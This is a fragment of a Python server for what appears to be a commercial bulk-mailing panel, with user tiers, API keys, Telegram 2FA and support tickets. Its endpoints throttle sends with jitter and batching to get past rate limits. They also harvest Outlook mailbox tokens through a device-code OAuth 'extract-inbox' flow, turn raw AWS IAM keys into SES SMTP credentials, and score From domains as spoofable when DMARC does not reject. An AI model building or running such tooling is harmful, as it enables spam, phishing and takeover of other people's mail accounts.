                    delay      = float(data.get("delay", 5) or 5),
                    jitter     = float(data.get("jitter", 3) or 3),
                    batch_size = int(data.get("batchSize", 0) or 0),
                    batch_delay= float(data.get("batchDelay", 60) or 60),
                    max_sends  = int(data.get("maxSends", 0) or 0),
                ):
                    try:
                        self._stream_chunk(event)
                    except (BrokenPipeError, ConnectionResetError):
                        return
            except Exception as e:
                try:
                    self._stream_chunk({"type": "error", "msg": str(e)[:300]})
                except Exception:
                    pass
            self._stream_end()

        # ── B2B: reset session ───────────────────────────────
        elif p == "/api/b2b/reset":
            if not (sess := self._auth()): return
            b2b = _get_b2b(sess["user_id"])
            b2b.reset()
            self._json(200, {"ok": True})

        # ── OAuth device code (legacy extract-inbox flow) ────
        elif p == "/api/oauth/device-code":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            client_id = data.get("clientId", "").strip()
            if not client_id:
                self._json(200, {"error": "Azure Client ID required"}); return
            try:
                import urllib.parse
                body = urllib.parse.urlencode({
                    "client_id": client_id,
                    "scope": "https://outlook.office365.com/IMAP.AccessAsUser.All offline_access",
                }).encode()
                req = Request(
                    "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
                    data=body, headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
                with urlopen(req, timeout=15) as resp:
                    self._json(200, json.loads(resp.read().decode()))
            except HTTPError as e:
                try:
                    err = json.loads(e.read().decode())
                    self._json(200, {"error": err.get("error_description", err.get("error", str(e)))})
                except Exception:
                    self._json(200, {"error": f"Microsoft {e.code}: {e.read()[:200]}"})
            except Exception as e:
                self._json(200, {"error": str(e)[:200]})

        # ── OAuth poll token ─────────────────────────────────
        elif p == "/api/oauth/poll-token":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            client_id   = data.get("clientId", "").strip()
            device_code = data.get("deviceCode", "").strip()
            if not client_id or not device_code:
                self._json(200, {"error": "clientId and deviceCode required"}); return
            try:
                import urllib.parse
                body = urllib.parse.urlencode({
                    "client_id":   client_id,
                    "grant_type":  "urn:ietf:params:oauth:grant-type:device_code",
                    "device_code": device_code,
                }).encode()
                req = Request(
                    "https://login.microsoftonline.com/common/oauth2/v2.0/token",
                    data=body, headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
                with urlopen(req, timeout=15) as resp:
                    self._json(200, json.loads(resp.read().decode()))
            except HTTPError as e:
                try:
                    self._json(200, json.loads(e.read().decode()))
                except Exception:
                    self._json(200, {"error": f"Poll failed: {e.code}"})
            except Exception as e:
                self._json(200, {"error": str(e)[:200]})

        # ── File upload ──────────────────────────────────────
        elif p == "/api/files/upload":
            if not (sess := self._auth()): return
            uid = sess["user_id"]
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            category  = data.get("category", "attachments")
            orig_name = data.get("name", "file")[:255]
            mime_type = data.get("mime", "application/octet-stream")[:100]
            b64_data  = data.get("data", "")
            if not b64_data:
                self._json(400, {"error": "No file data"}); return
            try:
                file_bytes = base64.b64decode(b64_data)
            except Exception:
                self._json(400, {"error": "Invalid base64 data"}); return
            if len(file_bytes) > 20 * 1024 * 1024:
                self._json(400, {"error": "File too large (max 20MB)"}); return
            user_dir = os.path.join(FILES_DIR, str(uid), category)
            os.makedirs(user_dir, exist_ok=True)
            safe_name = re.sub(r'[^\w\.\-]', '_', orig_name)
            filename = f"{uuid.uuid4().hex[:8]}_{safe_name}"
            fpath = os.path.join(user_dir, filename)
            with open(fpath, "wb") as f:
                f.write(file_bytes)
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                cur = conn.execute(
                    "INSERT INTO user_files (user_id,category,filename,orig_name,mime_type,size_bytes) VALUES (?,?,?,?,?,?)",
                    (uid, category, filename, orig_name, mime_type, len(file_bytes))
                )
                file_id = cur.lastrowid
                conn.commit(); conn.close()
            self._json(200, {"id": file_id, "name": orig_name, "filename": filename,
                              "size": len(file_bytes), "category": category})

        # ── Save user config ─────────────────────────────────
        elif p == "/api/configs/save":
            if not (sess := self._auth()): return
            uid = sess["user_id"]
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            config_type = data.get("type", "smtp")
            label       = data.get("label", "Unnamed")[:100]
            config_data = data.get("data", {})
            if not config_data:
                self._json(400, {"error": "No config data"}); return
            # Check for existing config with same label/type for this user
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                existing = conn.execute(
                    "SELECT id FROM user_configs WHERE user_id=? AND config_type=? AND label=?",
                    (uid, config_type, label)
                ).fetchone()
                if existing:
                    conn.execute(
                        "UPDATE user_configs SET data=?,updated_at=? WHERE id=?",
                        (json.dumps(config_data), datetime.now().isoformat(), existing[0])
                    )
                    config_id = existing[0]
                else:
                    cur = conn.execute(
                        "INSERT INTO user_configs (user_id,config_type,label,data) VALUES (?,?,?,?)",
                        (uid, config_type, label, json.dumps(config_data))
                    )
                    config_id = cur.lastrowid
                conn.commit(); conn.close()
            self._json(200, {"id": config_id, "label": label, "type": config_type})

        # ── Save user template ───────────────────────────────
        elif p == "/api/templates/save":
            if not (sess := self._auth()): return
            uid = sess["user_id"]
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            name    = data.get("name", "Unnamed")[:200]
            subject = data.get("subject", "")[:500]
            html    = data.get("html", "")[:100000]
            plain   = data.get("plain", "")[:50000]
            tid     = data.get("id")  # update if ID provided
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                if tid:
                    row = conn.execute(
                        "SELECT id FROM user_templates WHERE id=? AND user_id=?", (tid, uid)
                    ).fetchone()
                    if row:
                        conn.execute(
                            "UPDATE user_templates SET name=?,subject=?,html=?,plain=?,updated_at=? WHERE id=?",
                            (name, subject, html, plain, datetime.now().isoformat(), tid)
                        )
                        template_id = tid
                    else:
                        tid = None
                if not tid:
                    cur = conn.execute(
                        "INSERT INTO user_templates (user_id,name,subject,html,plain) VALUES (?,?,?,?,?)",
                        (uid, name, subject, html, plain)
                    )
                    template_id = cur.lastrowid
                conn.commit(); conn.close()
            self._json(200, {"id": template_id, "name": name})

        # ── Generate AWS SES SMTP credentials from IAM keys ──
        elif p == "/api/generate-ses-smtp":
            if not (sess := self._auth()): return
            try:
                data       = self._read_body()
                access_key = data.get("accessKey","").strip()
                secret_key = data.get("secretKey","").strip()
                region     = data.get("region","us-east-1").strip()
                if not access_key or not secret_key:
                    self._json(400, {"error": "accessKey and secretKey required"}); return
                # AWS SES SMTP password derivation (official algorithm)
                # https://docs.aws.amazon.com/ses/latest/dg/smtp-credentials.html
                import hmac, hashlib, base64
                DATE      = "11111111"
                SERVICE   = "ses"
                MSG       = "SendRawEmail"
                VERSION   = b"\x04"
                def _sign(key, msg):
                    return hmac.new(key, msg.encode("utf-8"), hashlib.sha256).digest()
                sig = _sign(
                    _sign(
                        _sign(
                            _sign(
                                _sign(("AWS4" + secret_key).encode("utf-8"), DATE),
                                region),
                            SERVICE),
                        "aws4_request"),
                    MSG)
                smtp_pass = base64.b64encode(VERSION + sig).decode("utf-8")
                smtp_host = f"email-smtp.{region}.amazonaws.com"
                self._json(200, {
                    "status":    "ok",
                    "smtpUser":  access_key,
                    "smtpPass":  smtp_pass,
                    "smtpHost":  smtp_host,
                    "smtpPort":  587,
                    "region":    region,
                    "message":   f"SMTP credentials generated for {region}"
                })
            except Exception as e:
                self._json(200, {"status":"error","message": str(e)})

        # ── Test SMTP ────────────────────────────────────────
        elif p == "/api/test-smtp":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            # Frontend sends smtp object directly OR nested under "smtp" key
            smtp = data.get("smtp", data)
            host = smtp.get("host", "")
            if not host:
                self._json(400, {"error": "SMTP host required"}); return
            import smtplib, ssl as ssl_mod
            port     = int(smtp.get("port", 587))
            username = smtp.get("username", smtp.get("user", ""))
            password = smtp.get("password", smtp.get("pass", ""))
            # Frontend uses ssl:true/false boolean; also support legacy encryption string
            ssl_bool   = smtp.get("ssl", smtp.get("ssl_tls", None))
            encryption = str(smtp.get("encryption", "")).upper()
            # Port 587 is always STARTTLS — ignore ssl flag if port is 587
            # Port 465 is always SSL/TLS
            if port == 465 or encryption == "SSL":
                mode = "SSL"
            elif port == 587 or port == 25 or port == 2525:
                mode = "STARTTLS"
            elif ssl_bool is True:
                mode = "SSL"
            elif ssl_bool is False:
                mode = "PLAIN"
            else:
                mode = "STARTTLS"
            # Permissive SSL ctx - don't fail on self-signed certs
            ctx = ssl_mod.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl_mod.CERT_NONE
            log = []
            try:
                t0 = time.time()
                if mode == "SSL":
                    log.append(f"Connecting SMTP_SSL {host}:{port}")
                    server = smtplib.SMTP_SSL(host, port, timeout=20, context=ctx)
                else:
                    log.append(f"Connecting SMTP {host}:{port} ({mode})")
                    server = smtplib.SMTP(host, port, timeout=20)
                    server.ehlo_or_helo_if_needed()
                    if mode == "STARTTLS":
                        log.append("Running STARTTLS")
                        server.starttls(context=ctx)
                        server.ehlo()
                if username and password:
                    log.append(f"AUTH as {username}")
                    server.login(username, password)
                server.quit()
                latency = round((time.time() - t0) * 1000)
                self._json(200, {"status": "ok",
                    "message": f"Connected & authenticated — {host}:{port} ({mode}) {latency}ms",
                    "latency_ms": latency, "log": log})
            except smtplib.SMTPAuthenticationError as e:
                raw = str(e)
                hint = ""
                if "535" in raw and "ses" in host.lower():
                    hint = " — AWS SES auth failed. Make sure you used the SMTP password from the generator (not your IAM secret key). Also verify your sending domain/email is verified in SES and your account is out of sandbox mode."
                elif "535" in raw:
                    hint = " — Wrong username/password. For Gmail use an App Password, not your account password."
                self._json(200, {"status": "error", "message": f"Auth failed{hint} [{raw[:200]}]", "log": log})
            except smtplib.SMTPConnectError as e:
                self._json(200, {"status": "error", "message": f"Cannot connect to {host}:{port} — port may be blocked", "log": log})
            except (ConnectionRefusedError, OSError) as e:
                self._json(200, {"status": "error", "message": f"Connection refused on {host}:{port} — check host/port", "log": log})
            except ssl_mod.SSLError as e:
                self._json(200, {"status": "error", "message": f"SSL error — try toggling SSL/TLS or use port 587 with STARTTLS. Detail: {str(e)[:200]}", "log": log})
            except Exception as e:
                self._json(200, {"status": "error", "message": str(e)[:400], "log": log})

        # ── Validate frommail via tunnel/DoH ─────────────────
        elif p == "/api/tools/validate-fromemail":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            emails = data.get("emails", [])
            if not emails:
                self._json(200, {"results": []}); return
            try:
                import concurrent.futures as _cf
                import socket as _sock2

                # ── Per-domain reputation check (runs all checks in parallel) ──
                def _check_domain(domain):
                    info = {
                        "mx": "", "mx_method": "",
                        "spf": "", "spf_status": "unknown",
                        "dmarc": "", "dmarc_status": "unknown",
                        "blacklisted": False, "blacklists": [],
                        "web_alive": False,
                        "issues": [], "warnings": [],
                    }

                    def _doh(qname, qtype):
                        """DoH lookup — returns list of answer dicts. Falls back Cloudflare → Google."""
                        for url in [
                            f"https://cloudflare-dns.com/dns-query?name={qname}&type={qtype}",
                            f"https://dns.google/resolve?name={qname}&type={qtype}",
                        ]:
                            try:
                                req = Request(url, headers={"Accept": "application/dns-json"})
                                r = urlopen(req, timeout=3)
                                d = json.loads(r.read().decode())
                                if d.get("Status") == 0:
                                    return d.get("Answer") or []
                            except Exception:
                                pass
                        return []

                    # ── MX ──────────────────────────────────────────────────
                    mx_ans = _doh(domain, "MX")
                    recs = []
                    for a in mx_ans:
                        if a.get("type") == 15:
                            parts = (a.get("data") or "").split()
                            if len(parts) >= 2:
                                try: recs.append((int(parts[0]), parts[1].rstrip(".")))
                                except: pass
                    if recs:
                        info["mx"] = sorted(recs)[0][1]
                        info["mx_method"] = "doh"
                    else:
                        # DNS fallback
                        try:
                            from core.mx_sender import _resolve_mx_all_methods
                            mx = _resolve_mx_all_methods(domain)
                            if mx:
                                info["mx"] = mx[0][1]
                                info["mx_method"] = "dns"
                        except Exception:
                            pass

                    # ── SPF ──────────────────────────────────────────────────
                    for a in _doh(domain, "TXT"):
                        if a.get("type") == 16:
                            t = (a.get("data") or "").strip('"')
                            if t.startswith("v=spf1"):
                                info["spf"] = t
                                break
                    spf = info["spf"]
                    if not spf:
                        info["spf_status"] = "missing"
                    elif "-all" in spf:
                        info["spf_status"] = "strict"
                    elif "~all" in spf:
                        info["spf_status"] = "softfail"
                    elif "+all" in spf:
                        info["spf_status"] = "permissive"
                    else:
                        info["spf_status"] = "present"

                    # ── DMARC ────────────────────────────────────────────────
                    for a in _doh(f"_dmarc.{domain}", "TXT"):
                        if a.get("type") == 16:
                            t = (a.get("data") or "").strip('"')
                            if "v=DMARC1" in t:
                                info["dmarc"] = t
                                break
                    dmarc = info["dmarc"]
                    if not dmarc:
                        info["dmarc_status"] = "missing"
                    elif "p=reject" in dmarc:
                        info["dmarc_status"] = "reject"
                    elif "p=quarantine" in dmarc:
                        info["dmarc_status"] = "quarantine"
                    elif "p=none" in dmarc:
                        info["dmarc_status"] = "none"
                    else:
                        info["dmarc_status"] = "present"

                    # ── DNSBL blacklist checks ───────────────────────────────
                    # Only use Spamhaus DBL — the only list specifically for
                    # FROM-address domain reputation. SURBL/URIBL are URL/body
                    # lists that flag gmail.com, yahoo.com etc. as false positives.
                    _FREE_PROVIDERS = {
                        "gmail.com","googlemail.com","yahoo.com","ymail.com",
                        "yahoo.co.uk","yahoo.ca","hotmail.com","hotmail.co.uk",
                        "hotmail.fr","outlook.com","outlook.co.uk","live.com",
                        "live.ca","msn.com","icloud.com","me.com","mac.com",
                        "aol.com","protonmail.com","proton.me","zoho.com",
                        "gmx.com","gmx.net","mail.com","cox.net","comcast.net",
                        "sbcglobal.net","att.net","verizon.net","bellsouth.net",
                    }
                    if domain not in _FREE_PROVIDERS:
                        for zone, name in [("dbl.spamhaus.org", "Spamhaus DBL")]:
                            try:
                                _sock2.getaddrinfo(f"{domain}.{zone}", None, _sock2.AF_INET)
                                info["blacklisted"] = True
                                info["blacklists"].append(name)
                            except _sock2.gaierror:
                                pass  # NXDOMAIN = not listed = good
                            except Exception:
                                pass

                    # ── Website reachability ─────────────────────────────────
                    for scheme in ("https", "http"):
                        try:
                            req = Request(f"{scheme}://{domain}", headers={"User-Agent":"Mozilla/5.0"})
                            r = urlopen(req, timeout=3)
                            if r.status < 400:
                                info["web_alive"] = True
                                break
                        except Exception:
                            pass

                    # ── Reputation score (0-100) ─────────────────────────────
                    score = 50  # baseline — MX alone is enough to send
                    if info["mx"]:             score += 20   # MX is mandatory, big bonus
                    if info["spf_status"] == "strict":   score += 15
                    elif info["spf_status"] == "softfail": score += 10
                    elif info["spf_status"] == "present":  score += 8
                    elif info["spf_status"] == "missing":  score -= 10  # warn, not fatal
                    if info["dmarc_status"] in ("reject","quarantine","none"): score += 10
                    elif info["dmarc_status"] == "missing": score -= 5   # warn only
                    if info["web_alive"]:      score += 5
                    if info["blacklisted"]:    score -= 50  # hard penalty
                    info["score"] = max(0, min(100, score))

                    # ── Issues + warnings ────────────────────────────────────
                    if not info["mx"]:
                        info["issues"].append("No MX record — domain doesn't exist or can't receive mail")
                    if info["dmarc_status"] == "reject":
                        info["issues"].append("DMARC p=reject — sends will be rejected by Gmail/Yahoo")
                    if info["blacklisted"]:
                        info["issues"].append(f"Blacklisted on: {', '.join(info['blacklists'])}")
                    if info["spf_status"] == "missing":
                        info["warnings"].append("No SPF — may show 'unverified sender' in Gmail/Outlook")
                    if info["dmarc_status"] == "missing":
                        info["warnings"].append("No DMARC — missing trust signal for bulk senders")
                    if info["dmarc_status"] == "quarantine":
                        info["warnings"].append("DMARC p=quarantine — failed sends may go to spam")
                    if not info["web_alive"]:
                        info["warnings"].append("Domain has no live website — lower sender trust")

                    info["sendable"] = bool(info["mx"]) and not info["blacklisted"] and info["dmarc_status"] != "reject"
                    info["valid"]    = bool(info["mx"])
                    return info

                # ── Run checks concurrently, one thread per unique domain ──
                domain_map = {}
                for email in emails:
                    email = email.strip()
                    if "@" in email:
                        domain_map.setdefault(email.split("@")[-1].lower(), []).append(email)
                    else:
                        domain_map  # skip invalid

                _TIMED_OUT = object()  # sentinel for domains that didn't finish
                cache = {}
                # 25 workers for big lists, 5s per individual check, 90s wall clock
                if not domain_map:
                    self._json(200, {"results":[],"total":0,"pass_count":0,"warn_count":0,"fail_count":0})
                    return
                _n_workers = max(1, min(len(domain_map), 25))
                with _cf.ThreadPoolExecutor(max_workers=_n_workers) as ex:
                    fut_map = {ex.submit(_check_domain, dom): dom for dom in domain_map}
                    # Drain completed futures with a generous wall-clock timeout.
                    # Any stragglers are marked with a timeout result — never crash.
                    try:
                        _iter = _cf.as_completed(fut_map, timeout=90)
                    except Exception:
                        _iter = fut_map.keys()
                    for fut in _iter:
                        dom = fut_map[fut]
                        try:
                            cache[dom] = fut.result(timeout=0)
                        except Exception as _fe:
                            cache[dom] = {"mx":"","mx_method":"","spf":"","spf_status":"error","dmarc":"","dmarc_status":"error","blacklisted":False,"blacklists":[],"web_alive":False,"score":0,"sendable":False,"valid":False,"issues":[str(_fe)[:120]],"warnings":[]}
                    # Any domains that still haven't finished → timeout placeholder
                    for _rem_fut, _rem_dom in fut_map.items():
                        if _rem_dom not in cache:
                            cache[_rem_dom] = {"mx":"","mx_method":"","spf":"","spf_status":"timeout","dmarc":"","dmarc_status":"timeout","blacklisted":False,"blacklists":[],"web_alive":False,"score":0,"sendable":False,"valid":False,"issues":["DNS timeout — could not check domain in time"],"warnings":[]}

                results = []
                for email in emails:
                    email = email.strip()
                    if "@" not in email:
                        results.append({"email":email,"valid":False,"sendable":False,"score":0,"issues":["Invalid format"],"warnings":[]})
                        continue
                    dom = email.split("@")[-1].lower()
                    info = cache.get(dom, {"valid":False,"sendable":False,"score":0,"issues":["Lookup failed"],"warnings":[]})
                    results.append({**info, "email": email})

                _pass = [r for r in results if r.get("sendable") and r.get("score",0)>=60 and not r.get("blacklisted")]
                _warn = [r for r in results if r.get("sendable") and (r.get("score",0)<60 or r.get("warnings")) and not r.get("blacklisted")]
                _fail = [r for r in results if not r.get("sendable")]
                self._json(200, {
                    "results":     results,
                    "total":       len(results),
                    "pass_count":  len(_pass),
                    "warn_count":  len(_warn),
                    "fail_count":  len(_fail),
                })
            except Exception as e:
                try:
                    self._json(200, {"error": str(e)[:300]})
                except (BrokenPipeError, ConnectionResetError, OSError):
                    pass  # client disconnected before we could send the error

        # ── Admin: create user ───────────────────────────────
        elif p == "/api/admin/users":
            if not (sess := self._admin()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            username   = data.get("username", "").strip().lower()
            password   = data.get("password", "")
            role       = data.get("role", "user")
            expires_at = data.get("expires_at") or None
            if not username or not password:
                self._json(400, {"error": "Username and password required"}); return
            if len(password) < MIN_PW_LEN:
                self._json(400, {"error": f"Password must be ≥{MIN_PW_LEN} characters"}); return
            if role not in ("user", "admin"): role = "user"
            if HAS_BCRYPT:
                pw_hash, salt = hash_password(password), ""
            else:
                salt    = secrets.token_hex(16)
                pw_hash = hash_password(password, salt)
            try:
                with db_lock:
                    conn = sqlite3.connect(DB_PATH)
                    conn.execute(
                        "INSERT INTO users (username,password_hash,salt,role,expires_at) VALUES (?,?,?,?,?)",
                        (username, pw_hash, salt, role, expires_at),
                    )
                    conn.commit(); conn.close()
                self._json(201, {"status": "ok", "username": username})
            except sqlite3.IntegrityError:
                self._json(409, {"error": f"Username '{username}' already exists"})

        # ── Admin: toggle user active ────────────────────────
        elif "/api/admin/users/" in p and "/toggle" in p:
            if not (sess := self._admin()): return
            try:
                uid = int(p.split("/")[4])
            except Exception:
                self._json(400, {"error": "Invalid user ID"}); return
            with db_lock:
                conn   = sqlite3.connect(DB_PATH)
                current= conn.execute("SELECT active,username FROM users WHERE id=?", (uid,)).fetchone()
                if not current:
                    conn.close(); self._json(404, {"error": "User not found"}); return
                if sess["username"] == current[1]:
                    conn.close(); self._json(400, {"error": "Cannot deactivate own account"}); return
                new_active = 0 if current[0] else 1
                conn.execute("UPDATE users SET active=? WHERE id=?", (new_active, uid))
                conn.commit(); conn.close()
            if not new_active:
                with sessions_lock:
                    to_kill = [t for t, s in SESSIONS.items() if s["user_id"] == uid]
                    for t in to_kill: del SESSIONS[t]
                with db_lock:
                    conn = sqlite3.connect(DB_PATH)
                    conn.execute("DELETE FROM sessions WHERE user_id=?", (uid,))
                    conn.commit(); conn.close()
            self._json(200, {"status": "ok", "active": bool(new_active)})

        # ── Admin: update user expiry ────────────────────────
        elif "/api/admin/users/" in p and "/expiry" in p:
            if not (sess := self._admin()): return
            try:
                uid  = int(p.split("/")[4])
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid request"}); return
            expires_at = data.get("expires_at") or None
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                conn.execute("UPDATE users SET expires_at=? WHERE id=?", (expires_at, uid))
                conn.commit(); conn.close()
            self._json(200, {"status": "ok"})

        # ── Admin: reset user password ───────────────────────
        elif "/api/admin/users/" in p and "/password" in p:
            if not (sess := self._admin()): return
            try:
                uid  = int(p.split("/")[4])
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid request"}); return
            new_pw = data.get("password", "")
            if len(new_pw) < MIN_PW_LEN:
                self._json(400, {"error": f"Password must be ≥{MIN_PW_LEN} characters"}); return
            if HAS_BCRYPT:
                new_hash, new_salt = hash_password(new_pw), ""
            else:
                new_salt = secrets.token_hex(16)
                new_hash = hash_password(new_pw, new_salt)
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                conn.execute("UPDATE users SET password_hash=?,salt=? WHERE id=?", (new_hash, new_salt, uid))
                conn.commit(); conn.close()
            with sessions_lock:
                to_kill = [t for t, s in SESSIONS.items() if s["user_id"] == uid]
                for t in to_kill: del SESSIONS[t]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                conn.execute("DELETE FROM sessions WHERE user_id=?", (uid,))
                conn.commit(); conn.close()
            self._json(200, {"status": "ok"})

        # ── Telegram: save bot config (admin) ───────────────────────────────
        elif p == "/api/tg/config":
            if not (sess := self._superadmin()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            if not TG_AVAILABLE:
                self._json(503, {"error": "Telegram module not available"}); return
            token = data.get("bot_token", "").strip()
            if token and token != "***":
                tg.set_config("bot_token", token)
                # Restart polling with new token
                tg.stop_polling()
                import time as _t; _t.sleep(1)
                tg.start_polling()
            tg.set_config("enabled", "1" if data.get("enabled") else "0")
            tg.set_config("notify_channel", data.get("notify_channel", ""))
            self._json(200, {"status": "ok"})

        # ── Telegram: generate link code for current user ─────────────────
        elif p == "/api/tg/link-code":
            if not (sess := self._auth()): return
            if not TG_AVAILABLE:
                self._json(503, {"error": "Telegram not configured"}); return
            code = tg.create_link_code(sess["user_id"])
            bot_info = tg.get_me()
            bot_name = bot_info.get("result", {}).get("username", "YourBot")
            self._json(200, {
                "code": code,
                "bot_username": bot_name,
                "link": f"https://t.me/{bot_name}?start={code}",
                "expires_in": 900,
            })

        # ── Telegram: unlink current user's Telegram ─────────────────────
        elif p == "/api/tg/unlink":
            if not (sess := self._auth()): return
            uid = sess["user_id"]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                conn.execute(
                    "UPDATE users SET tg_chat_id=NULL, tg_username=NULL, tg_2fa_enabled=0 WHERE id=?",
                    (uid,)
                )
                conn.commit(); conn.close()
            self._json(200, {"status": "ok"})

        # ── Telegram: toggle 2FA for current user ─────────────────────────
        elif p == "/api/tg/toggle-2fa":
            if not (sess := self._auth()): return
            uid  = sess["user_id"]
            if not TG_AVAILABLE:
                self._json(503, {"error": "Telegram not available"}); return
            tg_info = tg.get_user_tg(uid)
            if not tg_info:
                self._json(400, {"error": "Link Telegram first"}); return
            new_val = 0 if tg_info.get("tg_2fa_enabled") else 1
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                conn.execute("UPDATE users SET tg_2fa_enabled=? WHERE id=?", (new_val, uid))
                conn.commit(); conn.close()
            self._json(200, {"enabled": bool(new_val)})

        # ── Login: verify OTP (2FA second step) ───────────────────────────
        elif p == "/api/login/verify-otp":
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            pending_token = data.get("pending_token", "")
            otp_code      = data.get("otp_code", "")
            # Look up the pending session
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                row = conn.execute(
                    "SELECT user_id, username, role FROM sessions WHERE token=? AND expires > ?",
                    (pending_token, datetime.now().isoformat())
                ).fetchone()
                conn.close()
            if not row:
                self._json(401, {"error": "Invalid or expired session"}); return
            uid, uname, role = row
            if not TG_AVAILABLE or not tg.verify_otp(uid, otp_code):
                self._json(401, {"error": "Invalid or expired OTP"}); return
            # OTP verified — activate the session
            self._json(200, {
                "token": pending_token, "username": uname, "role": role,
                "status": "ok"
            })

        # ── Telegram: admin set user tier ─────────────────────────────────
        elif p == "/api/admin/set-role":
            if not (sess := self._superadmin()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            uid  = data.get("user_id")
            role = data.get("role", "user")
            if role not in ("user", "moderator", "admin", "superadmin"):
                self._json(400, {"error": "Invalid role"}); return
            # Prevent demoting self
            if uid == sess["user_id"] and role not in ("admin", "superadmin"):
                self._json(400, {"error": "Cannot demote your own account"}); return
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                conn.execute("UPDATE users SET role=? WHERE id=?", (role, uid))
                conn.commit(); conn.close()
            self._json(200, {"status": "ok"})

        # ── Admin: generate/reset user API key ────────────────────────────
        elif p == "/api/admin/api-key":
            if not (sess := self._admin()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            uid      = data.get("user_id")
            days     = int(data.get("days", 30))
            revoke   = data.get("revoke", False)
            if revoke:
                with db_lock:
                    conn = sqlite3.connect(DB_PATH)
                    conn.execute("UPDATE users SET api_key=NULL, api_key_expires=NULL WHERE id=?", (uid,))
                    conn.commit(); conn.close()
                self._json(200, {"status": "revoked"})
            else:
                key     = "sk-" + secrets.token_urlsafe(32)
                expires = (datetime.now() + timedelta(days=days)).isoformat()
                with db_lock:
                    conn = sqlite3.connect(DB_PATH)
                    conn.execute("UPDATE users SET api_key=?, api_key_expires=? WHERE id=?",
                                 (key, expires, uid))
                    conn.commit(); conn.close()
                self._json(200, {"api_key": key, "expires": expires, "days": days})

        # ── Support: create ticket ────────────────────────────────────────
        elif p == "/api/tickets":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            subject  = (data.get("subject", "") or "").strip()[:200]
            body     = (data.get("body", "") or "").strip()[:5000]
            priority = data.get("priority", "normal")
            if priority not in ("low", "normal", "high", "urgent"):
                priority = "normal"
            if not subject or not body:
                self._json(400, {"error": "Subject and body required"}); return
            uid   = sess["user_id"]
            uname = sess["username"]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                cur  = conn.execute(
                    "INSERT INTO support_tickets (user_id,subject,status,priority) VALUES (?,?,?,?)",
                    (uid, subject, "open", priority)
                )
                tid = cur.lastrowid
                conn.execute(
                    "INSERT INTO ticket_messages (ticket_id,sender_id,sender_name,is_admin,body) VALUES (?,?,?,?,?)",
                    (tid, uid, uname, 0, body)
                )
                conn.commit(); conn.close()
            # Notify admins via Telegram
            if TG_AVAILABLE:
                try:
                    tg.notify_new_ticket(tid, uname, subject, body)
                except Exception:
                    pass
            self._json(201, {"id": tid, "status": "open"})

        # ── Support: reply to ticket ──────────────────────────────────────
        elif p.startswith("/api/ticket/") and p.endswith("/reply"):
            if not (sess := self._auth()): return
            try:
                tid  = int(p.split("/")[3])
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid request"}); return
            body = (data.get("body", "") or "").strip()[:5000]
            if not body:
                self._json(400, {"error": "Reply body required"}); return
            uid   = sess["user_id"]
            uname = sess["username"]
            role  = sess["role"]
            is_admin_reply = role in ("admin", "superadmin", "moderator")
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                ticket = conn.execute(
                    "SELECT user_id, status FROM support_tickets WHERE id=?", (tid,)
                ).fetchone()
                if not ticket:
                    conn.close(); self._json(404, {"error": "Ticket not found"}); return
                if not is_admin_reply and ticket[0] != uid:
                    conn.close(); self._json(403, {"error": "Access denied"}); return
                conn.execute(
                    "INSERT INTO ticket_messages (ticket_id,sender_id,sender_name,is_admin,body) VALUES (?,?,?,?,?)",
                    (tid, uid, uname, 1 if is_admin_reply else 0, body)
                )
                conn.execute(
                    "UPDATE support_tickets SET status='open', updated_at=? WHERE id=?",
                    (datetime.now().isoformat(), tid)
                )
                ticket_owner_id = ticket[0]
                conn.commit(); conn.close()
            # Notify via Telegram
            if TG_AVAILABLE and is_admin_reply:
                try:
                    tg.notify_ticket_reply(tid, ticket_owner_id, uname, body)
                except Exception:
                    pass
            self._json(200, {"status": "ok"})

        # ── Support: close ticket ─────────────────────────────────────────
        elif p.startswith("/api/ticket/") and p.endswith("/close"):
            if not (sess := self._auth()): return
            try:
                tid = int(p.split("/")[3])
            except Exception:
                self._json(400, {"error": "Invalid ticket ID"}); return
            uid  = sess["user_id"]
            role = sess["role"]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                ticket = conn.execute(
                    "SELECT user_id FROM support_tickets WHERE id=?", (tid,)
                ).fetchone()
                if not ticket:
                    conn.close(); self._json(404, {"error": "Ticket not found"}); return
                if role not in ("admin","superadmin","moderator") and ticket[0] != uid:
